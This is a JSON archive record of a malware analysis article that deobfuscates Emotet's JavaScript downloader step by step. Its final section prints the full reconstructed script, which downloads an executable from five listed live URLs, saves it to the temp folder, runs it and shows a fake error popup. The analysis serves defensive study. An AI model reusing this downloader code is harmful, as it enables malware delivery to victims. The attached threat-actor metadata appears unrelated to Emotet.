{
    "id": "e697380d-f96f-41a1-9419-156901ac56d7",
    "created_at": "2023-01-12T15:06:16.062683Z",
    "updated_at": "2025-03-27T02:08:40.379593Z",
    "deleted_at": null,
    "sha1_hash": "51db5a94eea9635571e37808e8526b54d16034d1",
    "title": "2020-04-14 - Emotet JavaScript downloader",
    "authors": "",
    "file_creation_date": "2022-05-28T03:50:42Z",
    "file_modification_date": "2022-05-28T03:50:42Z",
    "file_size": 161293,
    "plain_text": "# Emotet JavaScript downloader\n\n**[maxkersten.nl/binary-analysis-course/malware-analysis/emotet-javascript-downloader/](https://maxkersten.nl/binary-analysis-course/malware-analysis/emotet-javascript-downloader/)**\n\n_This article was published on the 8th of April 2020. This article was updated on the 8th of_\n_December 2021._\n\nThe Emotet trojan is dropped in multiple stages. The first stage is an office file that contains\na macro. This macro then loads the second stage, which is either a PowerShell script or a\npiece of JavaScript. A PowerShell based downloader script that was used to downloaded the\n[Emotet binary, is analysed in the Emotet droppers article. In this article, a JavaScript based](https://maxkersten.nl/binary-analysis-course/malware-analysis/emotet-droppers/)\ndownloader is analysed in the usual step-by-step manner. At first, the obfuscation methods\nare explained, after which the deobfuscated sample is analysed.\n\n## Table of contents\n\n Sample information\n\nThe JavaScript based downloader is lauched by a macro in a Word document. The hashes\nof both samples are given below. Additionally a sample package (which contains both files)\n[can be downloaded from MalShare,](https://malshare.com/sample.php?action=detail&hash=fb8eacb936940d255e856bbe8dfba277) [Malware Bazaar, or](https://bazaar.abuse.ch/sample/ddfedf6178d86d3372922620116d8c973e0627b5ac1ef087cc7c15cfcc452480/) [VirusBay.](https://beta.virusbay.io/sample/browse/fb8eacb936940d255e856bbe8dfba277)\n```\nWord document MD-5: 12c0a3f94e87c9c4baa70e63cbb8f132\nWord document SHA-1: 219588d23f281f1fafad61780c115e1f61c7cd52\nWord document SHA-256:\n8d3de338b1f13c55c73461a24fef506de8733e392cd145cc3a6a843bab28ee3d\nJavaScript MD-5: b23fd915ab76f0d3f79d90c7cbb87f54\nJavaScript SHA-1: d8bd63db6475105200fbdcc09fcb1e1c4bbde190\nJavaScript SHA-256: b47c3e2c8dd09054e1eec662db8ee433acb494467b6517a3a022cd7c399cef17\n\n```\nNote that this article only covers the JavaScript based downloader.\n\n## Analysis outline\n\n[The JavaScript file is obfuscated using Obfuscator.io‘s obfuscator. One can inspect the](https://obfuscator.io/)\nobfuscator’s source code to understand how it works. Its not often that the obfuscator’s\nsource code is available, which is why its not used in this article. Understanding how to\napproach such a sample, and knowing how to recognise patterns in code, is a valuable skill\nto develop.\n\n## Deobfuscating the code\n\n\n-----\n\nThis article will show six steps that are required to remove the obfuscation. Firstly, the\noriginal strings are retrieved. After that, multiple dead code variants are removed. Thirdly, the\n_dictionary mappings within functions are addressed. Fourthly, the control flow is unflattened._\nFifthly, the function overrides are explained. Lastly, function callbacks are addressed.\n\nAfter the deobfuscation is complete, the original payload will be reconstructed and analysed\nstep-by-step.\n\n### Retrieving strings\n\nWithin the sample, the strings are stored in a single array, as can be seen when scrolling\nthrough the code. The strings are obtained from this array during run time. The code below\nprovides the string array, together with a function that alters the array.\n```\nvar a = ['base64-encoded-value', 'another-base64-encoded-value', ... ];\n(function(c, d) {\n  var e = function(f) {\n    while (--f) {\n      c['push'](c['shift']());\n    }\n  };\n  e(++d);\n}(a, 0x13b));\n\n```\nThe anonymous function shuffles the array’s order 0x13b places, or 315 in decimal. Directly\nbelow that, a function is defined. The code is given below.\n\n\n-----\n\n```\nvar b function(c, d) {\n  c = c - 0x0;\n  var e = a[c];\n  if (b['glFLpC'] === undefined) {\n    (function() {\n      var f = function() {\n        var g;\n        try {\n          g = Function('return\\x20(function()\\x20' +\n'{}.constructor(\\x22return\\x20this\\x22)(\\x20)' + ');')();\n        } catch (h) {\n          g = window;\n        }\n        return g;\n      };\n      var i = f();\n      var j =\n'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';\n      i['atob'] || (i['atob'] = function(k) {\n        var l = String(k)['replace'](/=+$/, '');\n        for (var m = 0x0, n, o, p = 0x0, q = ''; o = l['charAt'](p++); ~o &&\n(n = m % 0x4 ? n * 0x40 + o : o, m++ % 0x4) ? q += String['fromCharCode'](0xff & n >>\n(-0x2 * m & 0x6)) : 0x0) {\n          o = j['indexOf'](o);\n        }\n        return q;\n      });\n    }());\n    var r = function(s, d) {\n      var u = [],\n        v = 0x0,\n        w, x = '',\n        y = '';\n      s = atob(s);\n      for (var z = 0x0, A = s['length']; z < A; z++) {\n        y += '%' + ('00' + s['charCodeAt'](z)['toString'](0x10))['slice']\n(-0x2);\n      }\n      s = decodeURIComponent(y);\n      for (var B = 0x0; B < 0x100; B++) {\n        u[B] = B;\n      }\n      for (B = 0x0; B < 0x100; B++) {\n        v = (v + u[B] + d['charCodeAt'](B % d['length'])) % 0x100;\n        w = u[B];\n        u[B] = u[v];\n        u[v] = w;\n      }\n      B = 0x0;\n      v = 0x0;\n      for (var C = 0x0; C < s['length']; C++) {\n        B = (B + 0x1) % 0x100;\n        v = (v + u[B]) % 0x100;\n        w = u[B];\n        u[B] = u[v];\n\n```\n\n-----\n\n```\n        u[v] w;\n        x += String['fromCharCode'](s['charCodeAt'](C) ^ u[(u[B] + u[v]) %\n0x100]);\n      }\n      return x;\n    };\n    b['DeXxzd'] = r;\n    b['qjpvAF'] = {};\n    b['glFLpC'] = !![];\n  }\n  var D = b['qjpvAF'][c];\n  if (D === undefined) {\n    if (b['dXYIcg'] === undefined) {\n      b['dXYIcg'] = !![];\n    }\n    e = b['DeXxzd'](e, d);\n    b['qjpvAF'][c] = e;\n  } else {\n    e = D;\n  }\n  return e;\n};\n\n```\nThis function is called at places where a string is normally located in the script. An example\nof such a call is given below.\n```\nb('0x0', '(6q)')\n\n```\nThe first parameter is the index of the value in the string array, as can be seen in the code\nexcerpt below.\n```\nvar b = function(c, d) {\n  c = c - 0x0;\n  var e = a[c];\n\n```\nThe second argument is used in the decryption of he given string. Searching for some of the\n_[magic values, will lead to the conclusion that the RC4 encryption algorithm is used, and is](https://en.wikipedia.org/wiki/RC4)_\ndecrypted using this function. Note that the string array contains base64 encoded strings, as\nnot all encrypted output is printable. As such, the decryption function base64 decodes the\nstrings first, using the [atob function. The refactored function template is given below.](https://www.w3schools.com/jsref/met_win_atob.asp)\n```\ndecrypt(index, rc4_key)\n\n```\nNote that one can also find the usage of the RC4 encryption algorithm in the feature list of\nthe obfuscator. As stated prior, this article does not rely on the feature list nor source code of\nthe obfuscator, as this is not always available.\n\nTo clean the script, replace all occurrences of the decryption function with the result it returns\nfor the given array. One can copy the string array and shuffle function into the browser’s\nconsole to obtain the shuffled and decrypted values, or automate the process with a script. A\n\n\n-----\n\nversion of the script where all strings have been replaced is present in the file package that is\nprovided in the beginning.\n\n### Dead code removal\n\nWithin the script, dead code is present in several ways. The two most occurring methods are\nthe insertion of dead code in the form of variables and the creation of redundant ifstatements. To avoid automatic removal of unused variables, the variables link to other dead\ncode, thereby referencing each other. An example from the script is given below.\n```\nvar fS = 0x1522c;\nvar fT = 0x15cdc;\nvar fU = 0x8b7aec;\nWshShell = WScript[cb](ck);\nvar fY = 0xc1b1;\nvar fZ = 0x2f3869;\nvar g0 = 0x2d7f69;\nfY = fZ + fZ;\nfY = fZ + fY;\nfY = fY + fZ;\n\n```\nNot all dead code references other dead code. An example of dead code without references\nis given below. Additionally, this excerpt contains a redundant if-statement. Only when the\ncode is altered, statically or in-memory, the condition could be met.\n```\nif (\"JCqNE\" === \"nUZVy\") {\n  that = window;\n} else {\n  var eV = 0xf2bd6;\n  var eW = 0x169e;\n  var eX = new ce(c6);\n  var eY = 0xb66;\n  var eZ = 0x11c1d;\n  var f0 = \"KT!Wd0rRAcucX*QYYufz tnIg;ORkuP1?c[op38[z?8ROFKHKLpH?dOB<n,DmUDqnlm\nZPP*::AsISG ^;Iwprss;@xyOXzLfbb \";\n  var f1 = \"g3sO31;W8 Bd h0@fwgfpIlmlIj 1BJ l2S6#gZ[TLq6f.em!J9n^W:a9;o<ELSD^Qf\nZ9qwz?^doAeA[8;Z[n @kJeFqe2.:Yy.\";\n  var f2 = \"^8LUc?w0X%xOcUKoN @3EP,RPQ6yA#<EDN.qo*dTEsue1bLG7A9\niFNAQt0Cb[dJoJw0lrDPK@,y:mWno9N%by1t U 37NaKs sf\";\n  var f3 = 0x79219;\n  var f4 = '\\x5c' + Math['random']()[\"toString\"](0x24)['substr'](0x2, 0x9) + c5;\n  var f5 = 0x1522;\n  var f6 = 0.3686;\n  var f7 = eX[c2](0x2) + f4;\n  var f8 = \"xIs.f<Abe.qi<c8 dAyQZ EHMpUGgKXbX%htpP.JhQrAiDO.\n,,aU2J:Bpi$KSUe,W;*f#l[a?JkQcy!t# fR^t.wdykHgFaRljJ\";\n  var f9 = \"gwE1Txw;Q.AD[#8lnj0Gc*bKtfY:Pc!$dIMQ210!ziIYSdUrg01]x\nOXOkB%9U#$S]$usPz@*]Koi?peC6sW@O. SZ D#mWYG?Eg\";\n  return f7;\n}\n\n```\n\n-----\n\nIn the code above, the body within the if-statement is unreachable. Therefore the code within\nthe else-clause is executed. All variables are created within the condition, meaning they\ncease to exist outside of the else-body. In this case, f7 is returned, which references eX and\n_f4. Neither eX nor f4 references a variable that is created within the else-body. As such, the_\ncontent of the else-body can be rewritten without the garbage code. The rewritten excerpt is\ngiven below.\n```\nvar eX = new ce(c6);\nvar f4 = '\\x5c' + Math['random']()[\"toString\"](0x24)['substr'](0x2, 0x9) + c5;\nvar f7 = eX[c2](0x2) + f4;\nreturn f7;\n\n```\nThis makes the code more readable, and will allow for a quicker analysis later on.\n\n### Unflattening the control flow\n\nTo obscure the control flow, aside from the encrypted string array, dead code, and redundant\nif-statements, the control flow is flattened. The same concept is used within all occurrences\nin the script. At first, two variables are created. One contains a series of numbers that are\n[separated by pipes. Using the split function, an array is filled with the numbers in the given](https://www.w3schools.com/jsref/jsref_split.asp)\norder. The next variable is used to loop through the code. For each number in the sequence,\nthere is a piece of code present in a switch case. Using the order that is specified by the\narray, the code is executed in the original order. The code excerpt is given below.\n\n\n-----\n\n```\nvar fs 2|14|1|13|10|9|3|8|11|0|5|12|6|4|7 [ split ]( | ),\n  ft = 0x0;\nwhile (!![]) {\n  switch (fs[ft++]) {\n    case '0':\n      fv[eJ] = 0x1;\n      continue;\n    case '1':\n      var fu = 0xaef;\n      continue;\n    case '2':\n      var fv = new ce(fb);\n      continue;\n    case '3':\n      var fw = \"kF3k33%Ec6*BF1qd..dI8tFFU]0MuNGguJRpmfgeG33;g#9qlL,FF89N%\nZsr*WlaKA3 J!8Eq7oEbE[f2I<9B6OUtkkx?P9zge3\";\n      continue;\n    case '4':\n      fv[eL]();\n      continue;\n    case '5':\n      fv[eB](fd);\n      continue;\n    case '6':\n      fv[eK](fo, 0x2);\n      continue;\n    case '7':\n      return fe(fo, ![]);\n    case '8':\n      var fx = '.I0nbP*mepdcjxKFmyXFFwTeYKiR[PF%P<#[T%\\x20sRu$PRZcXfW*TN?\nT;UHsyl$13W2hq9thbu:D80HdX^lKw,9S@N\\x20ph;\\x202[sb.D';\n      continue;\n    case '9':\n      var fy = 0x2af;\n      continue;\n    case '10':\n      var fz = 0x3723db;\n      continue;\n    case '11':\n      fv[eH]();\n      continue;\n    case '12':\n      fv[eE] = 0x0;\n      continue;\n    case '13':\n      var fA = 0x1733b;\n      continue;\n    case '14':\n      var fB =\n';\\x20ImRFc[Attwgk%CuF*7Jf]geRCMS6mBQf,k\\x20],GdBPB$B8:*^9:zn*eCS?n\\x208:\n[[NcUlcTf0ZHzeyFY8BP9LLFd!h3QLz:b[jZr';\n      continue;\n  }\n  break;\n}\n\n```\n\n-----\n\nOnce reordered, the code becomes easier to read, as can be seen below.\n```\nvar fv = new ce(fb);\nvar fB = ';\\x20ImRFc[Attwgk%CuF*7Jf]geRCMS6mBQf,k\\x20],GdBPB$B8:*^9:zn*eCS?n\\x208:\n[[NcUlcTf0ZHzeyFY8BP9LLFd!h3QLz:b[jZr';\nvar fu = 0xaef;\nvar fA = 0x1733b;\nvar fz = 0x3723db;\nvar fy = 0x2af;\nvar fw = \"kF3k33%Ec6*BF1qd..dI8tFFU]0MuNGguJRpmfgeG33;g#9qlL,FF89N% Zsr*WlaKA3\nJ!8Eq7oEbE[f2I<9B6OUtkkx?P9zge3\";\nvar fx = '.I0nbP*mepdcjxKFmyXFFwTeYKiR[PF%P<#[T%\\x20sRu$PRZcXfW*TN?\nT;UHsyl$13W2hq9thbu:D80HdX^lKw,9S@N\\x20ph;\\x202[sb.D';\nfv[eH]();\nfv[eJ] = 0x1;\nfv[eB](fd);\nfv[eE] = 0x0;\nfv[eK](fo, 0x2);\nfv[eL]();\nreturn fe(fo, ![]);\n\n```\nNote the dead code that is present in the recovered code.\n\n### Remapping dictionaries\n\nAt the beginning of functions, a JavaScript object is made that contains fields with values.\nThese fields, and their values, serve as key-value pairs. In the function, the values will be\ntaken from the object to obscure the function’s purpose. An excerpt from the code is given\nbelow.\n\n\n-----\n\n```\nvar bg {\n  'CfYsK': function(bh, bi, bj) {\n    return bh(bi, bj);\n  },\n  'uBANR': \"8|0|2|7|1|4|6|3|5\",\n  'vVong': \"KT!Wd0rRAcucX*QYYufz tnIg;ORkuP1?c[op38[z?8ROFKHKLpH?dOB<n,DmUDqnlm\nZPP*::AsISG ^;Iwprss;@xyOXzLfbb \",\n  'tEaku': \"g3sO31;W8 Bd h0@fwgfpIlmlIj 1BJ l2S6#gZ[TLq6f.em!J9n^W:a9;o<ELSD^Qf\nZ9qwz?^doAeA[8;Z[n @kJeFqe2.:Yy.\",\n  'MwKva': '^8LUc?w0X%xOcUKoN\\x20@3EP,RPQ6yA#\n<EDN.qo*dTEsue1bLG7A9\\x20iFNAQt0Cb[dJoJw0lrDPK@,y:mWno9N%by1t\\x20U\\x2037NaKs\\x20sf',\n  'OtIWa': function(bk, bl) {\n    return bk + bl;\n  },\n  'NKXnB':\n'xIs.f<Abe.qi<c8\\x20dAyQZ\\x20EHMpUGgKXbX%htpP.JhQrAiDO.\\x20,,aU2J:Bpi$KSUe,W;*f#l[a?\nJkQcy!t#\\x20fR^t.wdykHgFaRljJ',\n  'mLaoo': \"gwE1Txw;Q.AD[#8lnj0Gc*bKtfY:Pc!$dIMQ210!ziIYSdUrg01]x\nOXOkB%9U#$S]$usPz@*]Koi?peC6sW@O. SZ D#mWYG?Eg\",\n  'pXVox': \"MsPFI\",\n  'YlyIl': \"return (function() \",\n  'GyBoN': \"{}.constructor(\\\"return this\\\")( )\",\n  'FnRMt': function(bm) {\n    return bm();\n  },\n  'icZPL': function(bn, bo) {\n    return bn === bo;\n  },\n  'FCQwq': \"JLmQv\",\n  'PPHdv': \"vmxRb\"\n};\nvar bp = function() {};\nvar bq;\ntry {\n  if (bg[\"pXVox\"] === bg['pXVox']) {\n    var br = Function(bg[\"OtIWa\"](bg[\n      \"YlyIl\"] + bg[\"GyBoN\"], ');'));\n    bq = bg[\"FnRMt\"](br);\n  } else {\n    return bg[\"CfYsK\"](callback, null, !![]);\n  }\n} catch (bt) {\n  bq = window;\n}\n\n```\nThe if-statement compares the same field from the object, meaning the value is irrelevant as\nit will always be equal. A new function is then created, where the function template as\ndefined in the OtIWa field is then used to add the two given parameters together. The first\nparameter is the value of YlyIl and GyBoN. The second value is equal to );. The value, once\nconcatenated, is given below.\n```\nreturn (function() {}.constructor(\\\"return this\\\")( ));\n\n```\n\n-----\n\nThis code is then executed as a function by using the function template that is defined in\n_FnRMt, whose return value is then stored in bq. The try-catch statement is written below in_\nthe cleaned form.\n```\nbq = (function() {}.constructor(\\\"return this\\\")( ));\n\n```\nNote that the try-catch structure has also been removed from the code, as it serves no\npurpose during the analysis and only clutters the overview the analyst creates.\n\n### Overriding default functions\n\nThe excerpt below is a part of the code that is used to override several functions that are\n[normally present in the console. A commonly used technique to see the value of an variable](https://developer.mozilla.org/en-US/docs/Web/API/Console)\nis to print it using console.log(variableName).\n\n\n-----\n\n```\nvar bp function() {};\nvar bq;\ntry {\n  if (bg[\"pXVox\"] === bg['pXVox']) {\n    var br = Function(bg[\"OtIWa\"](bg[\n      \"YlyIl\"] + bg[\"GyBoN\"], ');'));\n    bq = bg[\"FnRMt\"](br);\n  } else {\n    return bg[\"CfYsK\"](callback, null, !![]);\n  }\n} catch (bt) {\n  bq = window;\n}\nif (!bq[\"console\"]) {\n  bq[\"console\"] = function(bp) {\n    var bv = bg['uBANR'][\"split\"]('|'),\n      bw = 0x0;\n    while (!![]) {\n      switch (bv[bw++]) {\n        case '0':\n          aX['log'] = bp;\n          continue;\n        case '1':\n          aX[\"info\"] = bp;\n          continue;\n        case '2':\n          aX[\"warn\"] = bp;\n          continue;\n        case '3':\n          aX['trace'] = bp;\n          continue;\n        case '4':\n          aX[\"error\"] = bp;\n          continue;\n        case '5':\n          return aX;\n        case '6':\n          aX[\"exception\"] = bp;\n          continue;\n        case '7':\n          aX[\"debug\"] = bp;\n          continue;\n        case '8':\n          var aX = {};\n          continue;\n      }\n      break;\n    }\n  }(bp);\n} else {\n  if (bg[\"icZPL\"](bg['FCQwq'], bg[\"PPHdv\"])) {\n    var X = 0xf2bd6;\n    var Y = 0x169e;\n    var Z = new ce(c6);\n    var a0 = 0xb66;\n\n```\n\n-----\n\n```\n    var a1 0x11c1d;\n    var a2 = bg[\"vVong\"];\n    var a3 = bg['tEaku'];\n    var a4 = bg['MwKva'];\n    var a5 = 0x79219;\n    var a6 = bg[\"OtIWa\"](bg[\"OtIWa\"]('\\x5c', Math[\"random\"]()[\"toString\"](0x24)\n[\"substr\"](0x2, 0x9)), c5);\n    var a7 = 0x1522;\n    var a8 = 0.3686;\n    var a9 = Z[c2](0x2) + a6;\n    var aa = bg[\"NKXnB\"];\n    var ab = bg['mLaoo'];\n    return a9;\n  } else {\n    var bO = \"2|1|0|3|6|4|5\" [\"split\"]('|'),\n      bP = 0x0;\n    while (!![]) {\n      switch (bO[bP++]) {\n        case '0':\n          bq[\"console\"][\"debug\"] = bp;\n          continue;\n        case '1':\n          bq[\"console\"][\"warn\"] = bp;\n          continue;\n        case '2':\n          bq['console'][\"log\"] = bp;\n          continue;\n        case '3':\n          bq['console'][\"info\"] = bp;\n          continue;\n        case '4':\n          bq[\"console\"]['exception'] = bp;\n          continue;\n        case '5':\n          bq[\"console\"][\"trace\"] = bp;\n          continue;\n        case '6':\n          bq['console'][\"error\"] = bp;\n          continue;\n      }\n      break;\n    }\n  }\n}\n\n```\nSeveral fields within the console object are set equal to bp, which is defined as an empty\nfunction in the first line of the excerpt. This example also serves to show that not all\nobfuscation needs to be removed in order to make the code readable. The last switch does\nnot need to be removed, as the order of the execution does not matter. The fact that\nfunctions are replaced is already visible.\n\n\n-----\n\nCode segments like this are inserted to hinder dynamic analysis, which is often much quicker\nthan static analysis. Since this analysis is done statically, code segments like these are\nconsidered clutter. As such, they can be removed from the script once it is certain that none\nof the code that is present in the original input is handled within such a function.\n\n### Function callbacks\n\nUsually, a function requires arguments and returns a value based upon the input.\nSometimes, one or more of the arguments is also altered. It is also possible to provide a\nfunction as an argument. The obfuscation here passes a function with two arguments, which\nis done several times. The first argument is the data to use, whereas the second argument is\na boolean. Within the function, a check is done to see if the value is either true or false.\nDepending on the hardcoded path, either of these values is required to continue the\nexecution. This further obscures the execution path within the obfuscated code, especially if\nthis is done in all functions.\n\nTo illustrate the above, two functions will be discussed. Below, the cs function partially given.\n```\ncs(urlThree, function(dd, de) {\n     if (!de) {\n          return cT(dd, ![]);\n     }\n//[...]\n}\n\n```\nAs stated before, the function that is passed as the second argument requires two\nparameters. The first is the URL, and the second is the function to continue the execution in.\nIn this case, the hardcoded boolean value should be false.\n\nThe cs function is given below in its refactored form.\n```\nfunction cs(ct, cu) {\n  try {\n    var httpObject = new activeXObject(\"MSXML2.XMLHTTP\");\n    httpObject[\"open\"](\"GET\", ct, ![]);\n    httpObject[\"send\"]();\n    if (httpObject[\"status\"] == 200) {\n      return (cu(httpObject['ResponseBody'], ![]);\n    } else {\n      return cu(null, !![]);\n    }\n  } catch (cR) {\n    return cu(null, !![]);\n  }\n\n```\nIf the HTTP status code is equal to OK (status code 200), the Emotet binary could be\ndownloaded. Note that cu is the function that is passed to cs. The binary itself is then passed\nto cu as the first argument. The second argument that is passed to cu is ![], which equals\n\n\n-----\n\n_false. The boolean s value should be false to successfully continue the execution, as can be_\nseen in the code of cu.\n\nRewriting the code can be done by defining more functions that do not require the boolean to\nfollow the correct path, but return the first argument that is passed to given function. To\nillustrate, the cs function would return the response body.\n\n## Reconstructing the original script\n\nBased on the obfuscation techniques that are given above, one can clean the code.\nRemoving the content that is not centered around the interesting variables will remove the\nanti-tampering and anti-debugging code that is present. By removing the function callbacks,\nmore functions will be created, which also results in a clearer overview for the analyst.\n\nOnce all relevant code is gathered and cleaned, the original input can be recovered.\nFunctions names and variable names can be refactored to improve the readability of the\ncode even further.\n\n### Analysing the original script\n\nThe refactored and cleaned script is analysed in parts, after which the whole script is given.\n\nThe first part of the script contains the variables. As most of the variables occurred only\nonce, the sole occurence has been replaced by its value. The five URLs are stored in a\nsingle array, as this makes the iteration over all five URLs easier.\n```\nvar urls = ['https://miraigroupsumatera.com/wp-includes/wkcw90205/',\n\"https://careervsjob.com/wp-content/0nzppxq49/\",\n\"https://gaosanxuexi.com/css/q3z3ljo394/\",\n\"http://www.cbdnewsdirect.com/wordpress/5l1kpx45/\", 'https://kaaryathalo.com/wpcontent/231/'];\nvar activeXObject = 'ActiveXObject';\n\n```\nThe next function, named download, is used to download the Emotet binary from a given\n[URL using a Microsfot XML object. The request is not async, as is defined by the third](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ms757849(v%3Dvs.85))\nargument in the open function. Only if the HTTP status code is OK (which is equal to 200),\nthe response body is returned.\n```\nfunction download(url) {\n  var httpObject = new activeXObject(\"MSXML2.XMLHTTP\");\n  httpObject[\"open\"](\"GET\", url, false);\n  httpObject[\"send\"]();\n  if (httpObject[\"status\"] == 200) {\n    return httpObject['ResponseBody'];\n  } else {\n    return null;\n  }\n}\n\n```\n\n-----\n\nOnce downloaded, the response body needs to be saved somewhere. The getOutputPath\nfunction generates the full path, including a random file name with the exe extension to save\n[the downloaded binary to. The GetSpecialFolder function, when given the argument is 2,](https://www.w3schools.com/asp/met_getspecialfolder.asp)\nreturns the path to the temporary folder on the system.\n\nThe file name starts with \\x5c, which equals \\\\, as the temporary folder’s location does not\nend with a backslash. This needs to be added before the file name can be appended.\n\n[The file name is nine characters long, and is obtained using the random function. The result](https://www.w3schools.com/jsref/jsref_random.asp)\nfrom this function always starts with zero dot. To remove these two characters, a substring\nthat is nine characters long, starting at the second index, is taken.\n```\nfunction getOutputPath() {\n  var fileSystemObject = new activeXObject(\"Scripting.FileSystemObject\");\n  var fileName = '\\x5c' + Math.random().toString(36).substr(2, 9) + \".exe\";\n  var outputPath = fileSystemObject[\"GetSpecialFolder\"](2) + fileName;\n  return outputPath;\n}\n\n```\nThe saveAndRun function gets the the output path for the downloaded file, and saves the file\n[to the disk using an ADO Stream Object. The type is set to 1, which corresponds with the](https://www.w3schools.com/asp/ado_ref_stream.asp)\n_adTypeBinary constant in the_ [StreamTypeEnum. This is correct, since the downloaded data](https://www.w3schools.com/asp/prop_stream_type.asp#streamtypeenum)\nis a byte array.\n\nThe [SaveToFile function saves the file to the given location. The second parameter, 2, is](https://www.w3schools.com/asp/met_stream_savetofile.asp)\nequal to the adSaveCreateOverWrite constant in the [SaveOptionsEnum. If there already is a](https://www.w3schools.com/asp/met_stream_savetofile.asp#SaveOptionsEnum)\nfile with the randomly generated name, it is overwritten.\n\nAt last, the [WScript Shell is used to execute the file that was just written to the disk.](https://docs.microsoft.com/en-us/windows/win32/shell/shell-windows)\n```\nfunction saveAndRun(data) {\n  var outputPath = getOutputPath();    \n  var adodbStream = new activeXObject('ADODB.Stream');\n  adodbStream['Open']();\n  adodbStream[\"Type\"] = 1;\n  adodbStream[\"Write\"](data);\n  adodbStream[\"Position\"] = 0;\n  adodbStream[\"SaveToFile\"](outputPath, 2);\n  adodbStream[\"Close\"]();\n  var shell = new activeXObject(\"WScript.Shell\");\n  shell[\"Run\"](outputPath);\n}\n\n```\nThe start function is used to display the fake error message to the victim, using the WScript\nShell’s [Popup function. The first argument is the text to display. The second argument is the](https://www.vbsedit.com/html/f482c739-3cf9-4139-a6af-3bde299b8009.asp)\namount of seconds that the message box should maximally be displayed, where the value 0\nis used to mark the time frame as indefinite. The third argument is the title of the message\nbox. The last argument is the icon type of the messagebox, where 64 refers to the\ninformational message box icon.\n\n\n-----\n\n```\nfunction start(data, shouldRun) {\n  WshShell = WScript[\"CreateObject\"](\"WScript.Shell\");\n  Text = \"There was an error opening this document. The file is damaged and could\nnot be repaired (for example, it was sent as an email attachment and wasn't correctly\ndecoded).\";\n  Title = \"Not Supported File Format\";\n  Res = WshShell[\"Popup\"](Text, 0, Title, 64);\n  if (shouldRun) saveAndRun(data);\n}\n\n```\nAfter all functions have been defined, the URL array can be iterated through to download the\nbinary. If the download is successful, the data is saved to the disk, and then executed. At\nlast, the fake error message is displayed.\n```\nfor (var i = 0; i < urls.length; i++) {\n  var data = download(urls[i]);\n  if(data) start(data, true);\n}\n\n```\nThe complete script is given below.\n\n\n-----\n\n```\nvar urls [ https://miraigroupsumatera.com/wp includes/wkcw90205/,\n\"https://careervsjob.com/wp-content/0nzppxq49/\",\n\"https://gaosanxuexi.com/css/q3z3ljo394/\",\n\"http://www.cbdnewsdirect.com/wordpress/5l1kpx45/\", 'https://kaaryathalo.com/wpcontent/231/'];\nvar activeXObject = 'ActiveXObject';\nfunction download(url) {\n  var httpObject = new activeXObject(\"MSXML2.XMLHTTP\");\n  httpObject[\"open\"](\"GET\", url, false);\n  httpObject[\"send\"]();\n  if (httpObject[\"status\"] == 200) {\n    return httpObject['ResponseBody'];\n  } else {\n    return null;\n  }\n}\nfunction getOutputPath() {\n  var fileSystemObject = new activeXObject(\"Scripting.FileSystemObject\");\n  var fileName = '\\x5c' + Math.random().toString(36).substr(2, 9) + \".exe\";\n  var outputPath = fileSystemObject[\"GetSpecialFolder\"](2) + fileName;\n  return outputPath;\n}\nfunction saveAndRun(data) {\n  var outputPath = getOutputPath();    \n  var adodbStream = new activeXObject('ADODB.Stream');\n  adodbStream['Open']();\n  adodbStream[\"Type\"] = 1;\n  adodbStream[\"Write\"](data);\n  adodbStream[\"Position\"] = 0;\n  adodbStream[\"SaveToFile\"](outputPath, 2);\n  adodbStream[\"Close\"]();\n  var shell = new activeXObject(\"WScript.Shell\");\n  shell[\"Run\"](outputPath);\n}\nfunction start(data, shouldRun) {\n  WshShell = WScript[\"CreateObject\"](\"WScript.Shell\");\n  Text = \"There was an error opening this document. The file is damaged and could\nnot be repaired (for example, it was sent as an email attachment and wasn't correctly\ndecoded).\";\n  Title = \"Not Supported File Format\";\n  Res = WshShell[\"Popup\"](Text, 0, Title, 64);\n  if (shouldRun) saveAndRun(data);\n}\nfor (var i = 0; i < urls.length; i++) {\n  var data = download(urls[i]);\n  if(data) start(data, true);\n}\n\n## Conclusion\n\n```\n\n-----\n\nBy recognising patterns in the code, one can remove the obfuscation. This is, however, a\ntime consuming task. Therefore, it is essential to find a balance between deobfuscating code\nand reading obfuscated code. The amount of code that needs to be deobfuscated differs\nbased on the goal of the analysis.\n\nThe analysis, deobfuscation, and refactoring efforts reduced the code from 1067 lines of\ncode, into 46 lines of code. This is a reduction in size of more than 95 percent, allowing the\nanalyst to quickly read and understand the code. Based on this, future changes can be\ntracked without fully deobfuscating the sample.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-04-14 - Emotet JavaScript downloader.pdf"
    ],
    "report_names": [
        "2020-04-14 - Emotet JavaScript downloader.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535976,
    "ts_updated_at": 1743041320,
    "ts_creation_date": 1653709842,
    "ts_modification_date": 1653709842,
    "files": {
        "pdf": "https://archive.orkl.eu/51db5a94eea9635571e37808e8526b54d16034d1.pdf",
        "text": "https://archive.orkl.eu/51db5a94eea9635571e37808e8526b54d16034d1.txt",
        "img": "https://archive.orkl.eu/51db5a94eea9635571e37808e8526b54d16034d1.jpg"
    }
}